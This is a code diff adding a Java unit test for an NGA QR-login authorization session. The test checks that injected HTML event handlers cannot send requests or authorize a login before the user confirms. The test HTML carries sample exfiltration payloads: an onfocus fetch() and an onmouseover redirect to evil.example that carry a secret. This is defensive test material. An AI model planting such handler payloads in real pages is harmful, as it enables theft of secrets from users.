@@ -104,6 +104,46 @@ public class NgaQrAuthorizationSessionTest {
         }
     }
 
+    @Test public void inertEventsCannotLoadResourcesChangeRequestsOrAuthorizeBeforeConfirmation() throws Exception {
+        String handlerSecret = "HandlerSecretNeverSend_123";
+        String externalUrl = "https://evil.example/" + handlerSecret;
+        String html = FORM.replace("method='post'", "method='post' onsubmit='return false'")
+                .replace("type='hidden'", "type='hidden' onfocus='fetch(&quot;" + externalUrl + "&quot;)'")
+                .replace("</form>", "<img src='" + externalUrl + "' onerror='" + handlerSecret + "'>"
+                        + "<div onmouseover='location=&quot;" + externalUrl + "&quot;'>Ignored</div></form>");
+        List<Request> requests = new ArrayList<>();
+        AtomicReference<String> posted = new AtomicReference<>();
+        OkHttpClient client = NgaQrAuthorizationSession.newClientBuilder().addInterceptor(chain -> {
+            Request request = chain.request(); requests.add(request);
+            assertEquals("bbs.nga.cn", request.url().host());
+            assertFalse(request.url().toString().contains(handlerSecret));
+            assertFalse(request.headers().toString().contains(handlerSecret));
+            assertFalse(request.headers().toString().contains("evil.example"));
+            if (request.method().equals("POST")) {
+                assertTrue(request.body().isOneShot());
+                Buffer body = new Buffer(); request.body().writeTo(body); posted.set(body.readUtf8());
+            }
+            return response(request, 200, request.method().equals("GET") ? html : RESULT);
+        }).build();
+        try (NgaQrAuthorizationSession session = new NgaQrAuthorizationSession(TARGET, "42", TOKEN, "test", () -> true, client)) {
+            session.prepare();
+            assertFalse(session.wasSubmitted());
+            assertNull(posted.get());
+            assertEquals(1, requests.size());
+            assertEquals("GET", requests.get(0).method());
+            assertEquals(TARGET.url, requests.get(0).url().toString());
+            assertEquals(NgaQrLoginResult.Kind.SERVER_MESSAGE, session.submit().kind);
+            assertEquals(2, requests.size());
+            assertEquals("POST", requests.get(1).method());
+            assertEquals(TARGET.authorizationUrl, requests.get(1).url().toString());
+            assertEquals("qrkey=" + KEY + "&_csrf=a%26b%3D%2B", posted.get());
+            assertFalse(posted.get().contains(handlerSecret));
+            assertFalse(posted.get().contains("evil.example"));
+            assertEquals(NgaQrLoginResult.Kind.UNCONFIRMED, session.submit().kind);
+            assertEquals(2, requests.size());
+        }
+    }
+
     @Test public void closeAndChangedRevisionPreventAnyPost() throws Exception {
         for (boolean cancel : new boolean[] {false, true}) {
             AtomicBoolean current = new AtomicBoolean(true);
